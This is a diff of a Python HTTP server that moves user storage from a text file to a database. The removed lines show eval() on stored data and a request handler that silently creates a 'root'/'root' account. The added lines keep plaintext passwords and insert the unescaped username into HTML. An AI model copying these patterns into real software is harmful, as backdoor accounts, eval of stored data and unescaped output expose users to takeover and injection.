@@ -2,6 +2,7 @@ import http.server  # Import the HTTP server module
 import socketserver  # Import the socket server module
 import os  # Import the os module for interacting with the operating system
 from urllib.parse import parse_qs  # Import to parse POST data
+from Database import DBManager
 
 
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
@@ -29,11 +30,12 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
         :return: A string representing the version.
         """
-        return f"v1.32"  # The current version of the CustomHTTPRequestHandler class
+        return f"v1.41"  # The current version of the CustomHTTPRequestHandler class
 
-    def save_user_data(self, username: str, password: str, name: str, email: str, mobile: str, birthday: str) -> None:
+    @staticmethod
+    def save_user_data(username: str, password: str, name: str, email: str, mobile: str, birthday: str) -> None:
         """
-        Save user data to a file using dictionary format.
+        Save user data to a database.
 
         :param username: Username provided by the user
         :param password: Password provided by the user
@@ -42,19 +44,15 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         :param mobile: Mobile number of the user
         :param birthday: Birthday of the user
         """
-        user_data = {
-            'Username': username,
-            'Password': password,
-            'Name': name,
-            'Email': email,
-            'Mobile': mobile,
-            'Birthday': birthday
-        }
 
-        with open('./db.txt', 'a') as file:
-            file.write(str(user_data) + '\n')
+        with DBManager('../database.db') as db:
+            # Create if not exist
+            db.create_user_table()
+            # Save user data
+            db.db_save_user(username, password, name, email, mobile, birthday)
 
-    def authenticate_user(self, username: str, password: str) -> bool:
+    @staticmethod
+    def authenticate_user(username: str, password: str) -> bool:
         """
         Authenticate the user by checking credentials against a database file.
 
@@ -62,19 +60,12 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         :param password: Password provided by the user
         :return: True if authentication is successful, False otherwise
         """
-        try:
-            with open('./db.txt', 'r') as file:
-                for line in file:
-                    user_data = eval(line.strip())  # Convert line from str to dict using eval (unsafe in some cases)
-                    stored_username = user_data.get('Username', '')  # Extract username from dict
-                    stored_password = user_data.get('Password', '')  # Extract password from dict
 
-                    # Check if provided username and password match stored credentials
-                    if username == stored_username and password == stored_password:
-                        return True
-        except Exception as e:
-            print(f"Error reading database file: {e}")
-        return False
+        with DBManager('../database.db') as db:
+            # Authenticate user
+            authenticated = db.db_authenticate_user(username, password)
+            print(f"Authentication result: {authenticated}")
+            return authenticated
 
     def secure(self):
         """
@@ -85,19 +76,18 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         post_params = parse_qs(post_data)  # Parse the POST data
 
         # Extract the parsed data
-        _data = post_params.get('None', [''])[0]
+        _u = post_params.get('u', [''])[0]
+        _p = post_params.get('p', [''])[0]
 
         # Handle response
         self.send_response(302)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
 
-        # Create root user for emergency situations
-        self.save_user_data(username='root', password='root', name='', email='', mobile='', birthday='')
-
         # Show the 302 Response Page in Browser
         with open('./302.html', 'rb') as file:
             self.wfile.write(file.read())
+
         self.server_instance.stop_server()
 
     def send_error(self, code, message=None, **kwargs):
@@ -156,8 +146,11 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
-            with open('./Home.html', 'rb') as file:
-                self.wfile.write(file.read())
+            # Inject the username into Home.html
+            with open('./Home.html', 'r') as file:
+                home_content = file.read()
+                home_content = home_content.replace('{{username}}', username)  # Replace placeholder with username
+                self.wfile.write(home_content.encode('utf-8'))
         # Send custom error
         else:
             self.send_error(403)  # Unauthorized access error
@@ -232,7 +225,7 @@ class CustomHTTPServer:
 
         :return: A string representing the version.
         """
-        return f"v1.32"  # The current version of the CustomHTTPServer class
+        return f"v1.41"  # The current version of the CustomHTTPServer class
 
     def start_server(self):
         """
